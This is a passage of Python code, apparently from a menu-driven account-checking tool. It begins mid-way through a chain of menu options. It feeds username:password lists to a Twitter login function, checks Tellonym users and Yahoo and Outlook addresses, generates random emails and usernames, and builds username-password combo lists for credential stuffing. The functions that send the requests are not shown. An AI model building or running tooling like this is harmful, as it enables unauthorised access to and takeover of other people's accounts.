    elif what == '02':
        lists = input("\tEnter list accounts : ")
        print("")
        openlist = open(lists, 'r').readlines()
        i = 0
        for accounts in openlist:
            account = accounts.split(':')
            username = account[0]
            password = account[1]
            Twitter(username, password)

elif chooses == '01':
    lists = input("\tEnter list Users : ")
    print("")
    openlist = open(lists, 'r').readlines()

    i = 0
    for user in openlist:
        i += 1
        users = f"{user}".strip()
        tellonym(users, i)

elif chooses == '02':
    List_ForEmails = input("\t[+] Enter Emails List [Emails.txt] : ")
    openlist = open(List_ForEmails, 'r').readlines()
    for users in openlist:
        username = f"{users}".strip()
        #start Scan yahoo Domain And Replace Error
        if "@yahoo.com" in username:
            if username.startswith('.'):
                username3 = username.replace('.', '')
                username2 = f"{username3}".strip()
                Email_Chacker.Scan_Yahoo(username2)
            elif username.startswith('-'):
                username3 = username.replace('-', '')
                username2 = f"{username3}".strip()
                Email_Chacker.Scan_Yahoo(username2)
            elif username.startswith('_'):
                username3 = username.replace('_', '')
                username2 = f"{username3}".strip()
                Email_Chacker.Scan_Yahoo(username2)
            else:
                username1 = f"{username}".strip()
                Email_Chacker.Scan_Yahoo(username1)

        #start Scan outlook Domain And Replace Error
        elif "@outlook.com" in username:
            if username.startswith('.'):
                username3 = username.replace('.', '')
                username2 = f"{username3}".strip()
                Email_Chacker.scan_Outlook(username2)
            elif username.startswith('-'):
                username3 = username.replace('-', '')
                username2 = f"{username3}".strip()
                Email_Chacker.scan_Outlook(username2)
            elif username.startswith('_'):
                username3 = username.replace('_', '')
                username2 = f"{username3}".strip()
                Email_Chacker.scan_Outlook(username2)
            else:
                username1 = f"{username}".strip()
                Email_Chacker.scan_Outlook(username1)

elif chooses == '03':
    how = int(input("\t[+] Enter how Many  Email : "))
    random_Emails(how)

    ema = list(dict.fromkeys(Emails))
    for i in ema:
        w = open('Emails.txt', 'a')
        l = f"{i}\n"
        w.write(l)

elif chooses == '04':
    num = input('\t[+] Enter user limt  [3/4/5/]: ')
    how = int(input("\t[+] Enter how Many  Email : "))
    randomuser(how, num)
    for i in userlist:
        open('userlist.txt', 'a').write(f"{i}\n")

elif chooses == '05':
    list1 = input("\t[+] Enter list for user : ")
    list2 = input("\t[+] Enter list for passowrd : ")
    print(Fore.YELLOW, f"\t[Example] username:password")
    username = open(list1, 'r').readlines()
    passwords = open(list2, 'r').readlines()

    for i in username:
        ii = f"{i}".strip()
        for m in passwords:
            mm = f"{m}".strip()
            with open("combo.txt", "a") as wr:
                wr.write(ii + ":" + mm + '\n')
